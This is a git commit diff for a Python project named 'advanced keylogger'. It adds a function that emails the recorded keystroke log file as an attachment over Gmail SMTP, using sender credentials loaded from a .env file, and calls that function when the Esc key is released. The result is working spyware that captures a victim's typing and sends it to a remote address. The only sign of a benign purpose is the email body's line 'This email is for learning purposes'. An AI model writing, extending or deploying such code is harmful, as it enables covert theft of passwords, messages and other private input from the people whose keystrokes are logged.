82308b33fdba8db300cd20827579936b5f27edb1
mrtaz77 <mrtazwar23@gmail.com>
2024-04-14 16:57:44 +0600

    send_mail function

--- advanced keylogger/main.py
+++ advanced keylogger/main.py
@@ -25,15 +25,57 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+from dotenv import load_dotenv
+
 script_directory = os.path.dirname(os.path.abspath(__file__))
 log_file_path = os.path.join(script_directory, "log.txt")
+env_path = os.path.join(script_directory, ".env")
+load_dotenv(env_path)
 
 BUFFER_COUNT = 30
 buffer = ""
 keystroke_count = 0
 line_count = 0
-script_directory = os.path.dirname(os.path.abspath(__file__))
-log_file_path = os.path.join(script_directory, "log.txt")
+fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
+password = os.getenv('PASSWORD')
+toAddress = os.getenv('TO_EMAIL_ADDRESS')
+
+def send_email(filename, attachment, toAddress):
+	msg = MIMEMultipart()
+	msg['From'] = fromAddress
+	msg['To'] = toAddress
+	msg['Subject'] = "Keylogger logs"
+
+	body = "This email is for learning purposes"
+	msg.attach(MIMEText(body, 'plain'))
+
+	attachment = open(attachment, 'rb')
+
+	mime_base = MIMEBase('application', 'octet-stream')
+	mime_base.set_payload((attachment).read())
+
+	encoders.encode_base64(mime_base)
+
+	mime_base.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+
+	msg.attach(mime_base)
+
+	smtp = smtplib.SMTP('smtp.gmail.com', 587)
+	smtp.starttls()
+
+	try :
+		smtp.login(fromAddress, password)
+	except Exception as e :
+		print("Login failed")
+
+	text = msg.as_string()
+
+	try :
+		smtp.sendmail(fromAddress, toAddress, text)
+	except Exception as e :
+		print("Failed to send mail")
+
+	smtp.quit()
 
 def on_press(key):
 	global buffer, keystroke_count, line_count
@@ -51,7 +93,7 @@ def on_press(key):
 		write_log()
 
 def info():
-    return """\n\
+	return """\n\
 =======================\n\
 Text length : {0}\n\
 No of keystrokes : {1}\n\
@@ -71,7 +113,9 @@ def on_release(key):
 	# break loop on pressing esc
 	if key == Key.esc :
 		write_log()
+		send_email("log.txt", log_file_path, toAddress)
 		return False
+		
 
 # what to do when a key is pressed and released respectively
 with Listener(on_press = on_press, on_release = on_release) as listener:
